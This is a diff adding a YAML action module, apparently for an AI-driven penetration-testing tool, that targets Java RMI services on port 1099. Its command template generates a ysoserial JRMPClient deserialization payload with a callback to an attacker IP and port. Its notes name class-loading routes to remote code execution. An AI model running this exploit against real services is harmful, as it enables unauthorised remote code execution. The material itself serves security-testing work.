@@ -1,0 +1,16 @@
+name: java_rmi
+category: services
+description: Java RMI exploitation
+preconditions:
+  - service.port==1099
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "java -jar ysoserial-all.jar JRMPClient {attacker_ip}:9999 | xxd"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Java RMI: remote method invocation. BeanShell/Groovy class loading for direct RCE. ysoserial JRMP payloads for deserialization attacks. rmg for enumeration."
